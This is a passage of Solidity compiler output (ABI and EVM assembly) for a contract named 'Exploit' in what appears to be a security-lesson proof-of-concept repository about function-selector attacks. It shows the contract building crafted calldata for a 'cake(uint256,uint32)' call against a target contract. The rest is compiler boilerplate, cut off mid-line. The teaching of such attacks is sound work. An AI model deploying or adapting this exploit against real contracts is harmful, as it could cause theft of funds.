{
	"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol": {
		"Exploit": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_cake",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "cake",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "exploit",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":186:436  contract Exploit {... */\n  mstore(0x40, 0x80)\n    /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":294:295  0 */\n  0x00\n    /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":296:297  0 */\n  dup1\n    /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":247:298  abi.encodeWithSignature(\"cake(uint256,uint32)\",0,0) */\n  add(0x24, mload(0x40))\n  tag_1\n  swap3\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n  mload(0x40)\n  0x20\n  dup2\n  dup4\n  sub\n  sub\n  dup2\n  mstore\n  swap1\n  0x40\n  mstore\n  and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x7986d61300000000000000000000000000000000000000000000000000000000)\n  0x20\n  dup3\n  add\n  dup1\n  mload\n  0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n  dup4\n  dup2\n  dup4\n  and\n  or\n  dup4\n  mstore\n  pop\n  pop\n  pop\n  pop\n    /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":234:298  bytes data = abi.encodeWithSignature(\"cake(uint256,uint32)\",0,0) */\n  0x01\n  swap1\n  dup2\n  tag_3\n  swap2\n  swap1\n  tag_4\n  jump\t// in\ntag_3:\n  pop\n    /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":304:360  constructor(address _cake) {... */\n  callvalue\n  dup1\n  iszero\n  tag_5\n  jumpi\n  0x00\n  dup1\n  revert\ntag_5:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_6\n  swap2\n  swap1\n  tag_7\n  jump\t// in\ntag_6:\n    /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":348:353  _cake */\n  dup1\n    /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":341:345  cake */\n  0x00\n  dup1\n    /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":341:353  cake = _cake */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":304:360  constructor(address _cake) {... */\n  pop\n    /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":186:436  contract Exploit {... */\n  jump(tag_10)\n    /* \"#utility.yul\":7:92   */\ntag_11:\n    /* \"#utility.yul\":52:59   */\n  0x00\n    /* \"#utility.yul\":81:86   */\n  dup2\n    /* \"#utility.yul\":70:86   */\n  swap1\n  pop\n    /* \"#utility.yul\":7:92   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":98:184   */\ntag_12:\n    /* \"#utility.yul\":133:140   */\n  0x00\n    /* \"#utility.yul\":173:177   */\n  0xff\n    /* \"#utility.yul\":166:171   */\n  dup3\n    /* \"#utility.yul\":162:178   */\n  and\n    /* \"#utility.yul\":151:178   */\n  swap1\n  pop\n    /* \"#utility.yul\":98:184   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":190:250   */\ntag_13:\n    /* \"#utility.yul\":218:221   */\n  0x00\n    /* \"#utility.yul\":239:244   */\n  dup2\n    /* \"#utility.yul\":232:244   */\n  swap1\n  pop\n    /* \"#utility.yul\":190:250   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":256:410   */\ntag_14:\n    /* \"#utility.yul\":312:321   */\n  0x00\n    /* \"#utility.yul\":345:404   */\n  tag_47\n    /* \"#utility.yul\":361:403   */\n  tag_48\n    /* \"#utility.yul\":370:402   */\n  tag_49\n    /* \"#utility.yul\":396:401   */\n  dup5\n    /* \"#utility.yul\":370:402   */\n  tag_11\n  jump\t// in\ntag_49:\n    /* \"#utility.yul\":361:403   */\n  tag_13\n  jump\t// in\ntag_48:\n    /* \"#utility.yul\":345:404   */\n  tag_12\n  jump\t// in\ntag_47:\n    /* \"#utility.yul\":332:404   */\n  swap1\n  pop\n    /* \"#utility.yul\":256:410   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":416:559   */\ntag_15:\n    /* \"#utility.yul\":509:552   */\n  tag_51\n    /* \"#utility.yul\":546:551   */\n  dup2\n    /* \"#utility.yul\":509:552   */\n  tag_14\n  jump\t// in\ntag_51:\n    /* \"#utility.yul\":504:507   */\n  dup3\n    /* \"#utility.yul\":497:553   */\n  mstore\n    /* \"#utility.yul\":416:559   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":565:921   */\ntag_2:\n    /* \"#utility.yul\":698:702   */\n  0x00\n    /* \"#utility.yul\":736:738   */\n  0x40\n    /* \"#utility.yul\":725:734   */\n  dup3\n    /* \"#utility.yul\":721:739   */\n  add\n    /* \"#utility.yul\":713:739   */\n  swap1\n  pop\n    /* \"#utility.yul\":749:826   */\n  tag_53\n    /* \"#utility.yul\":823:824   */\n  0x00\n    /* \"#utility.yul\":812:821   */\n  dup4\n    /* \"#utility.yul\":808:825   */\n  add\n    /* \"#utility.yul\":799:805   */\n  dup6\n    /* \"#utility.yul\":749:826   */\n  tag_15\n  jump\t// in\ntag_53:\n    /* \"#utility.yul\":836:914   */\n  tag_54\n    /* \"#utility.yul\":910:912   */\n  0x20\n    /* \"#utility.yul\":899:908   */\n  dup4\n    /* \"#utility.yul\":895:913   */\n  add\n    /* \"#utility.yul\":886:892   */\n  dup5\n    /* \"#utility.yul\":836:914   */\n  tag_15\n  jump\t// in\ntag_54:\n    /* \"#utility.yul\":565:921   */\n  swap4\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":927:1025   */\ntag_16:\n    /* \"#utility.yul\":978:984   */\n  0x00\n    /* \"#utility.yul\":1012:1017   */\n  dup2\n    /* \"#utility.yul\":1006:1018   */\n  mload\n    /* \"#utility.yul\":996:1018   */\n  swap1\n  pop\n    /* \"#utility.yul\":927:1025   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1031:1211   */\ntag_17:\n    /* \"#utility.yul\":1079:1156   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":1076:1077   */\n  0x00\n    /* \"#utility.yul\":1069:1157   */\n  mstore\n    /* \"#utility.yul\":1176:1180   */\n  0x41\n    /* \"#utility.yul\":1173:1174   */\n  0x04\n    /* \"#utility.yul\":1166:1181   */\n  mstore\n    /* \"#utility.yul\":1200:1204   */\n  0x24\n    /* \"#utility.yul\":1197:1198   */\n  0x00\n    /* \"#utility.yul\":1190:1205   */\n  revert\n    /* \"#utility.yul\":1217:1397   */\ntag_18:\n    /* \"#utility.yul\":1265:1342   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":1262:1263   */\n  0x00\n    /* \"#utility.yul\":1255:1343   */\n  mstore\n    /* \"#utility.yul\":1362:1366   */\n  0x22\n    /* \"#utility.yul\":1359:1360   */\n  0x04\n    /* \"#utility.yul\":1352:1367   */\n  mstore\n    /* \"#utility.yul\":1386:1390   */\n  0x24\n    /* \"#utility.yul\":1383:1384   */\n  0x00\n    /* \"#utility.yul\":1376:1391   */\n  revert\n    /* \"#utility.yul\":1403:1723   */\ntag_19:\n    /* \"#utility.yul\":1447:1453   */\n  0x00\n    /* \"#utility.yul\":1484:1485   */\n  0x02\n    /* \"#utility.yul\":1478:1482   */\n  dup3\n    /* \"#utility.yul\":1474:1486   */\n  div\n    /* \"#utility.yul\":1464:1486   */\n  swap1\n  pop\n    /* \"#utility.yul\":1531:1532   */\n  0x01\n    /* \"#utility.yul\":1525:1529   */\n  dup3\n    /* \"#utility.yul\":1521:1533   */\n  and\n    /* \"#utility.yul\":1552:1570   */\n  dup1\n    /* \"#utility.yul\":1542:1623   */\n  tag_59\n  jumpi\n    /* \"#utility.yul\":1608:1612   */\n  0x7f\n    /* \"#utility.yul\":1600:1606   */\n  dup3\n    /* \"#utility.yul\":1596:1613   */\n  and\n    /* \"#utility.yul\":1586:1613   */\n  swap2\n  pop\n    /* \"#utility.yul\":1542:1623   */\ntag_59:\n    /* \"#utility.yul\":1670:1672   */\n  0x20\n    /* \"#utility.yul\":1662:1668   */\n  dup3\n    /* \"#utility.yul\":1659:1673   */\n  lt\n    /* \"#utility.yul\":1639:1657   */\n  dup2\n    /* \"#utility.yul\":1636:1674   */\n  sub\n    /* \"#utility.yul\":1633:1717   */\n  tag_60\n  jumpi\n    /* \"#utility.yul\":1689:1707   */\n  tag_61\n  tag_18\n  jump\t// in\ntag_61:\n    /* \"#utility.yul\":1633:1717   */\ntag_60:\n    /* \"#utility.yul\":1454:1723   */\n  pop\n    /* \"#utility.yul\":1403:1723   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1729:1869   */\ntag_20:\n    /* \"#utility.yul\":1777:1781   */\n  0x00\n    /* \"#utility.yul\":1800:1803   */\n  dup2\n    /* \"#utility.yul\":1792:1803   */\n  swap1\n  pop\n    /* \"#utility.yul\":1823:1826   */\n  dup2\n    /* \"#utility.yul\":1820:1821   */\n  0x00\n    /* \"#utility.yul\":1813:1827   */\n  mstore\n    /* \"#utility.yul\":1857:1861   */\n  0x20\n    /* \"#utility.yul\":1854:1855   */\n  0x00\n    /* \"#utility.yul\":1844:1862   */\n  keccak256\n    /* \"#utility.yul\":1836:1862   */\n  swap1\n  pop\n    /* \"#utility.yul\":1729:1869   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1875:1968   */\ntag_21:\n    /* \"#utility.yul\":1912:1918   */\n  0x00\n    /* \"#utility.yul\":1959:1961   */\n  0x20\n    /* \"#utility.yul\":1954:1956   */\n  0x1f\n    /* \"#utility.yul\":1947:1952   */\n  dup4\n    /* \"#utility.yul\":1943:1957   */\n  add\n    /* \"#utility.yul\":1939:1962   */\n  div\n    /* \"#utility.yul\":1929:1962   */\n  swap1\n  pop\n    /* \"#utility.yul\":1875:1968   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1974:2081   */\ntag_22:\n    /* \"#utility.yul\":2018:2026   */\n  0x00\n    /* \"#utility.yul\":2068:2073   */\n  dup3\n    /* \"#utility.yul\":2062:2066   */\n  dup3\n    /* \"#utility.yul\":2058:2074   */\n  shl\n    /* \"#utility.yul\":2037:2074   */\n  swap1\n  pop\n    /* \"#utility.yul\":1974:2081   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2087:2480   */\ntag_23:\n    /* \"#utility.yul\":2156:2162   */\n  0x00\n    /* \"#utility.yul\":2206:2207   */\n  0x08\n    /* \"#utility.yul\":2194:2204   */\n  dup4\n    /* \"#utility.yul\":2190:2208   */\n  mul\n    /* \"#utility.yul\":2229:2326   */\n  tag_66\n    /* \"#utility.yul\":2259:2325   */\n  0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":2248:2257   */\n  dup3\n    /* \"#utility.yul\":2229:2326   */\n  tag_22\n  jump\t// in\ntag_66:\n    /* \"#utility.yul\":2347:2386   */\n  tag_67\n    /* \"#utility.yul\":2377:2385   */\n  dup7\n    /* \"#utility.yul\":2366:2375   */\n  dup4\n    /* \"#utility.yul\":2347:2386   */\n  tag_22\n  jump\t// in\ntag_67:\n    /* \"#utility.yul\":2335:2386   */\n  swap6\n  pop\n    /* \"#utility.yul\":2419:2423   */\n  dup1\n    /* \"#utility.yul\":2415:2424   */\n  not\n    /* \"#utility.yul\":2408:2413   */\n  dup5\n    /* \"#utility.yul\":2404:2425   */\n  and\n    /* \"#utility.yul\":2395:2425   */\n  swap4\n  pop\n    /* \"#utility.yul\":2468:2472   */\n  dup1\n    /* \"#utility.yul\":2458:2466   */\n  dup7\n    /* \"#utility.yul\":2454:2473   */\n  and\n    /* \"#utility.yul\":2447:2452   */\n  dup5\n    /* \"#utility.yul\":2444:2474   */\n  or\n    /* \"#utility.yul\":2434:2474   */\n  swap3\n  pop\n    /* \"#utility.yul\":2163:2480   */\n  pop\n  pop\n    /* \"#utility.yul\":2087:2480   */\n  swap4\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2486:2563   */\ntag_24:\n    /* \"#utility.yul\":2523:2530   */\n  0x00\n    /* \"#utility.yul\":2552:2557   */\n  dup2\n    /* \"#utility.yul\":2541:2557   */\n  swap1\n  pop\n    /* \"#utility.yul\":2486:2563   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2569:2711   */\ntag_25:\n    /* \"#utility.yul\":2619:2628   */\n  0x00\n    /* \"#utility.yul\":2652:2705   */\n  tag_70\n    /* \"#utility.yul\":2670:2704   */\n  tag_71\n    /* \"#utility.yul\":2679:2703   */\n  tag_72\n    /* \"#utility.yul\":2697:2702   */\n  dup5\n    /* \"#utility.yul\":2679:2703   */\n  tag_24\n  jump\t// in\ntag_72:\n    /* \"#utility.yul\":2670:2704   */\n  tag_13\n  jump\t// in\ntag_71:\n    /* \"#utility.yul\":2652:2705   */\n  tag_24\n  jump\t// in\ntag_70:\n    /* \"#utility.yul\":2639:2705   */\n  swap1\n  pop\n    /* \"#utility.yul\":2569:2711   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2717:2792   */\ntag_26:\n    /* \"#utility.yul\":2760:2763   */\n  0x00\n    /* \"#utility.yul\":2781:2786   */\n  dup2\n    /* \"#utility.yul\":2774:2786   */\n  swap1\n  pop\n    /* \"#utility.yul\":2717:2792   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2798:3067   */\ntag_27:\n    /* \"#utility.yul\":2908:2947   */\n  tag_75\n    /* \"#utility.yul\":2939:2946   */\n  dup4\n    /* \"#utility.yul\":2908:2947   */\n  tag_25\n  jump\t// in\ntag_75:\n    /* \"#utility.yul\":2969:3060   */\n  tag_76\n    /* \"#utility.yul\":3018:3059   */\n  tag_77\n    /* \"#utility.yul\":3042:3058   */\n  dup3\n    /* \"#utility.yul\":3018:3059   */\n  tag_26\n  jump\t// in\ntag_77:\n    /* \"#utility.yul\":3010:3016   */\n  dup5\n    /* \"#utility.yul\":3003:3007   */\n  dup5\n    /* \"#utility.yul\":2997:3008   */\n  sload\n    /* \"#utility.yul\":2969:3060   */\n  tag_23\n  jump\t// in\ntag_76:\n    /* \"#utility.yul\":2963:2967   */\n  dup3\n    /* \"#utility.yul\":2956:3061   */\n  sstore\n    /* \"#utility.yul\":2874:3067   */\n  pop\n    /* \"#utility.yul\":2798:3067   */\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3073:3146   */\ntag_28:\n    /* \"#utility.yul\":3118:3121   */\n  0x00\n    /* \"#utility.yul\":3073:3146   */\n  swap1\n  jump\t// out\n    /* \"#utility.yul\":3152:3341   */\ntag_29:\n    /* \"#utility.yul\":3229:3261   */\n  tag_80\n  tag_28\n  jump\t// in\ntag_80:\n    /* \"#utility.yul\":3270:3335   */\n  tag_81\n    /* \"#utility.yul\":3328:3334   */\n  dup2\n    /* \"#utility.yul\":3320:3326   */\n  dup5\n    /* \"#utility.yul\":3314:3318   */\n  dup5\n    /* \"#utility.yul\":3270:3335   */\n  tag_27\n  jump\t// in\ntag_81:\n    /* \"#utility.yul\":3205:3341   */\n  pop\n    /* \"#utility.yul\":3152:3341   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3347:3533   */\ntag_30:\n    /* \"#utility.yul\":3407:3527   */\ntag_83:\n    /* \"#utility.yul\":3424:3427   */\n  dup2\n    /* \"#utility.yul\":3417:3422   */\n  dup2\n    /* \"#utility.yul\":3414:3428   */\n  lt\n    /* \"#utility.yul\":3407:3527   */\n  iszero\n  tag_85\n  jumpi\n    /* \"#utility.yul\":3478:3517   */\n  tag_86\n    /* \"#utility.yul\":3515:3516   */\n  0x00\n    /* \"#utility.yul\":3508:3513   */\n  dup3\n    /* \"#utility.yul\":3478:3517   */\n  tag_29\n  jump\t// in\ntag_86:\n    /* \"#utility.yul\":3451:3452   */\n  0x01\n    /* \"#utility.yul\":3444:3449   */\n  dup2\n    /* \"#utility.yul\":3440:3453   */\n  add\n    /* \"#utility.yul\":3431:3453   */\n  swap1\n  pop\n    /* \"#utility.yul\":3407:3527   */\n  jump(tag_83)\ntag_85:\n    /* \"#utility.yul\":3347:3533   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3539:4080   */\ntag_31:\n    /* \"#utility.yul\":3639:3641   */\n  0x1f\n    /* \"#utility.yul\":3634:3637   */\n  dup3\n    /* \"#utility.yul\":3631:3642   */\n  gt\n    /* \"#utility.yul\":3628:4073   */\n  iszero\n  tag_88\n  jumpi\n    /* \"#utility.yul\":3673:3710   */\n  tag_89\n    /* \"#utility.yul\":3704:3709   */\n  dup2\n    /* \"#utility.yul\":3673:3710   */\n  tag_20\n  jump\t// in\ntag_89:\n    /* \"#utility.yul\":3756:3785   */\n  tag_90\n    /* \"#utility.yul\":3774:3784   */\n  dup5\n    /* \"#utility.yul\":3756:3785   */\n  tag_21\n  jump\t// in\ntag_90:\n    /* \"#utility.yul\":3746:3754   */\n  dup2\n    /* \"#utility.yul\":3742:3786   */\n  add\n    /* \"#utility.yul\":3939:3941   */\n  0x20\n    /* \"#utility.yul\":3927:3937   */\n  dup6\n    /* \"#utility.yul\":3924:3942   */\n  lt\n    /* \"#utility.yul\":3921:3970   */\n  iszero\n  tag_91\n  jumpi\n    /* \"#utility.yul\":3960:3968   */\n  dup2\n    /* \"#utility.yul\":3945:3968   */\n  swap1\n  pop\n    /* \"#utility.yul\":3921:3970   */\ntag_91:\n    /* \"#utility.yul\":3983:4063   */\n  tag_92\n    /* \"#utility.yul\":4039:4061   */\n  tag_93\n    /* \"#utility.yul\":4057:4060   */\n  dup6\n    /* \"#utility.yul\":4039:4061   */\n  tag_21\n  jump\t// in\ntag_93:\n    /* \"#utility.yul\":4029:4037   */\n  dup4\n    /* \"#utility.yul\":4025:4062   */\n  add\n    /* \"#utility.yul\":4012:4023   */\n  dup3\n    /* \"#utility.yul\":3983:4063   */\n  tag_30\n  jump\t// in\ntag_92:\n    /* \"#utility.yul\":3643:4073   */\n  pop\n  pop\n    /* \"#utility.yul\":3628:4073   */\ntag_88:\n    /* \"#utility.yul\":3539:4080   */\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4086:4203   */\ntag_32:\n    /* \"#utility.yul\":4140:4148   */\n  0x00\n    /* \"#utility.yul\":4190:4195   */\n  dup3\n    /* \"#utility.yul\":4184:4188   */\n  dup3\n    /* \"#utility.yul\":4180:4196   */\n  shr\n    /* \"#utility.yul\":4159:4196   */\n  swap1\n  pop\n    /* \"#utility.yul\":4086:4203   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4209:4378   */\ntag_33:\n    /* \"#utility.yul\":4253:4259   */\n  0x00\n    /* \"#utility.yul\":4286:4337   */\n  tag_96\n    /* \"#utility.yul\":4334:4335   */\n  0x00\n    /* \"#utility.yul\":4330:4336   */\n  not\n    /* \"#utility.yul\":4322:4327   */\n  dup5\n    /* \"#utility.yul\":4319:4320   */\n  0x08\n    /* \"#utility.yul\":4315:4328   */\n  mul\n    /* \"#utility.yul\":4286:4337   */\n  tag_32\n  jump\t// in\ntag_96:\n    /* \"#utility.yul\":4282:4338   */\n  not\n    /* \"#utility.yul\":4367:4371   */\n  dup1\n    /* \"#utility.yul\":4361:4365   */\n  dup4\n    /* \"#utility.yul\":4357:4372   */\n  and\n    /* \"#utility.yul\":4347:4372   */\n  swap2\n  pop\n    /* \"#utility.yul\":4260:4378   */\n  pop\n    /* \"#utility.yul\":4209:4378   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4383:4678   */\ntag_34:\n    /* \"#utility.yul\":4459:4463   */\n  0x00\n    /* \"#utility.yul\":4605:4634   */\n  tag_98\n    /* \"#utility.yul\":4630:4633   */\n  dup4\n    /* \"#utility.yul\":4624:4628   */\n  dup4\n    /* \"#utility.yul\":4605:4634   */\n  tag_33\n  jump\t// in\ntag_98:\n    /* \"#utility.yul\":4597:4634   */\n  swap2\n  pop\n    /* \"#utility.yul\":4667:4670   */\n  dup3\n    /* \"#utility.yul\":4664:4665   */\n  0x02\n    /* \"#utility.yul\":4660:4671   */\n  mul\n    /* \"#utility.yul\":4654:4658   */\n  dup3\n    /* \"#utility.yul\":4651:4672   */\n  or\n    /* \"#utility.yul\":4643:4672   */\n  swap1\n  pop\n    /* \"#utility.yul\":4383:4678   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4683:6073   */\ntag_4:\n    /* \"#utility.yul\":4798:4834   */\n  tag_100\n    /* \"#utility.yul\":4830:4833   */\n  dup3\n    /* \"#utility.yul\":4798:4834   */\n  tag_16\n  jump\t// in\ntag_100:\n    /* \"#utility.yul\":4899:4917   */\n  0xffffffffffffffff\n    /* \"#utility.yul\":4891:4897   */\n  dup2\n    /* \"#utility.yul\":4888:4918   */\n  gt\n    /* \"#utility.yul\":4885:4941   */\n  iszero\n  tag_101\n  jumpi\n    /* \"#utility.yul\":4921:4939   */\n  tag_102\n  tag_17\n  jump\t// in\ntag_102:\n    /* \"#utility.yul\":4885:4941   */\ntag_101:\n    /* \"#utility.yul\":4965:5003   */\n  tag_103\n    /* \"#utility.yul\":4997:5001   */\n  dup3\n    /* \"#utility.yul\":4991:5002   */\n  sload\n    /* \"#utility.yul\":4965:5003   */\n  tag_19\n  jump\t// in\ntag_103:\n    /* \"#utility.yul\":5050:5116   */\n  tag_104\n    /* \"#utility.yul\":5109:5115   */\n  dup3\n    /* \"#utility.yul\":5101:5107   */\n  dup3\n    /* \"#utility.yul\":5095:5099   */\n  dup6\n    /* \"#utility.yul\":5050:5116   */\n  tag_31\n  jump\t// in\ntag_104:\n    /* \"#utility.yul\":5143:5144   */\n  0x00\n    /* \"#utility.yul\":5167:5171   */\n  0x20\n    /* \"#utility.yul\":5154:5171   */\n  swap1\n  pop\n    /* \"#utility.yul\":5199:5201   */\n  0x1f\n    /* \"#utility.yul\":5191:5197   */\n  dup4\n    /* \"#utility.yul\":5188:5202   */\n  gt\n    /* \"#utility.yul\":5216:5217   */\n  0x01\n    /* \"#utility.yul\":5211:5828   */\n  dup2\n  eq\n  tag_106\n  jumpi\n    /* \"#utility.yul\":5872:5873   */\n  0x00\n    /* \"#utility.yul\":5889:5895   */\n  dup5\n    /* \"#utility.yul\":5886:5963   */\n  iszero\n  tag_107\n  jumpi\n    /* \"#utility.yul\":5938:5947   */\n  dup3\n    /* \"#utility.yul\":5933:5936   */\n  dup8\n    /* \"#utility.yul\":5929:5948   */\n  add\n    /* \"#utility.yul\":5923:5949   */\n  mload\n    /* \"#utility.yul\":5914:5949   */\n  swap1\n  pop\n    /* \"#utility.yul\":5886:5963   */\ntag_107:\n    /* \"#utility.yul\":5989:6056   */\n  tag_108\n    /* \"#utility.yul\":6049:6055   */\n  dup6\n    /* \"#utility.yul\":6042:6047   */\n  dup3\n    /* \"#utility.yul\":5989:6056   */\n  tag_34\n  jump\t// in\ntag_108:\n    /* \"#utility.yul\":5983:5987   */\n  dup7\n    /* \"#utility.yul\":5976:6057   */\n  sstore\n    /* \"#utility.yul\":5845:6067   */\n  pop\n    /* \"#utility.yul\":5181:6067   */\n  jump(tag_105)\n    /* \"#utility.yul\":5211:5828   */\ntag_106:\n    /* \"#utility.yul\":5263:5267   */\n  0x1f\n    /* \"#utility.yul\":5259:5268   */\n  not\n    /* \"#utility.yul\":5251:5257   */\n  dup5\n    /* \"#utility.yul\":5247:5269   */\n  and\n    /* \"#utility.yul\":5297:5333   */\n  tag_109\n    /* \"#utility.yul\":5328:5332   */\n  dup7\n    /* \"#utility.yul\":5297:5333   */\n  tag_20\n  jump\t// in\ntag_109:\n    /* \"#utility.yul\":5355:5356   */\n  0x00\n    /* \"#utility.yul\":5369:5577   */\ntag_110:\n    /* \"#utility.yul\":5383:5390   */\n  dup3\n    /* \"#utility.yul\":5380:5381   */\n  dup2\n    /* \"#utility.yul\":5377:5391   */\n  lt\n    /* \"#utility.yul\":5369:5577   */\n  iszero\n  tag_112\n  jumpi\n    /* \"#utility.yul\":5462:5471   */\n  dup5\n    /* \"#utility.yul\":5457:5460   */\n  dup10\n    /* \"#utility.yul\":5453:5472   */\n  add\n    /* \"#utility.yul\":5447:5473   */\n  mload\n    /* \"#utility.yul\":5439:5445   */\n  dup3\n    /* \"#utility.yul\":5432:5474   */\n  sstore\n    /* \"#utility.yul\":5513:5514   */\n  0x01\n    /* \"#utility.yul\":5505:5511   */\n  dup3\n    /* \"#utility.yul\":5501:5515   */\n  add\n    /* \"#utility.yul\":5491:5515   */\n  swap2\n  pop\n    /* \"#utility.yul\":5560:5562   */\n  0x20\n    /* \"#utility.yul\":5549:5558   */\n  dup6\n    /* \"#utility.yul\":5545:5563   */\n  add\n    /* \"#utility.yul\":5532:5563   */\n  swap5\n  pop\n    /* \"#utility.yul\":5406:5410   */\n  0x20\n    /* \"#utility.yul\":5403:5404   */\n  dup2\n    /* \"#utility.yul\":5399:5411   */\n  add\n    /* \"#utility.yul\":5394:5411   */\n  swap1\n  pop\n    /* \"#utility.yul\":5369:5577   */\n  jump(tag_110)\ntag_112:\n    /* \"#utility.yul\":5605:5611   */\n  dup7\n    /* \"#utility.yul\":5596:5603   */\n  dup4\n    /* \"#utility.yul\":5593:5612   */\n  lt\n    /* \"#utility.yul\":5590:5769   */\n  iszero\n  tag_113\n  jumpi\n    /* \"#utility.yul\":5663:5672   */\n  dup5\n    /* \"#utility.yul\":5658:5661   */\n  dup10\n    /* \"#utility.yul\":5654:5673   */\n  add\n    /* \"#utility.yul\":5648:5674   */\n  mload\n    /* \"#utility.yul\":5706:5754   */\n  tag_114\n    /* \"#utility.yul\":5748:5752   */\n  0x1f\n    /* \"#utility.yul\":5740:5746   */\n  dup10\n    /* \"#utility.yul\":5736:5753   */\n  and\n    /* \"#utility.yul\":5725:5734   */\n  dup3\n    /* \"#utility.yul\":5706:5754   */\n  tag_33\n  jump\t// in\ntag_114:\n    /* \"#utility.yul\":5698:5704   */\n  dup4\n    /* \"#utility.yul\":5691:5755   */\n  sstore\n    /* \"#utility.yul\":5613:5769   */\n  pop\n    /* \"#utility.yul\":5590:5769   */\ntag_113:\n    /* \"#utility.yul\":5815:5816   */\n  0x01\n    /* \"#utility.yul\":5811:5812   */\n  0x02\n    /* \"#utility.yul\":5803:5809   */\n  dup9\n    /* \"#utility.yul\":5799:5813   */\n  mul\n    /* \"#utility.yul\":5795:5817   */\n  add\n    /* \"#utility.yul\":5789:5793   */\n  dup9\n    /* \"#utility.yul\":5782:5818   */\n  sstore\n    /* \"#utility.yul\":5218:5828   */\n  pop\n  pop\n  pop\n    /* \"#utility.yul\":5181:6067   */\ntag_105:\n  pop\n    /* \"#utility.yul\":4773:6073   */\n  pop\n  pop\n  pop\n    /* \"#utility.yul\":4683:6073   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6160:6277   */\ntag_36:\n    /* \"#utility.yul\":6269:6270   */\n  0x00\n    /* \"#utility.yul\":6266:6267   */\n  dup1\n    /* \"#utility.yul\":6259:6271   */\n  revert\n    /* \"#utility.yul\":6406:6532   */\ntag_38:\n    /* \"#utility.yul\":6443:6450   */\n  0x00\n    /* \"#utility.yul\":6483:6525   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":6476:6481   */\n  dup3\n    /* \"#utility.yul\":6472:6526   */\n  and\n    /* \"#utility.yul\":6461:6526   */\n  swap1\n  pop\n    /* \"#utility.yul\":6406:6532   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6538:6634   */\ntag_39:\n    /* \"#utility.yul\":6575:6582   */\n  0x00\n    /* \"#utility.yul\":6604:6628   */\n  tag_120\n    /* \"#utility.yul\":6622:6627   */\n  dup3\n    /* \"#utility.yul\":6604:6628   */\n  tag_38\n  jump\t// in\ntag_120:\n    /* \"#utility.yul\":6593:6628   */\n  swap1\n  pop\n    /* \"#utility.yul\":6538:6634   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6640:6762   */\ntag_40:\n    /* \"#utility.yul\":6713:6737   */\n  tag_122\n    /* \"#utility.yul\":6731:6736   */\n  dup2\n    /* \"#utility.yul\":6713:6737   */\n  tag_39\n  jump\t// in\ntag_122:\n    /* \"#utility.yul\":6706:6711   */\n  dup2\n    /* \"#utility.yul\":6703:6738   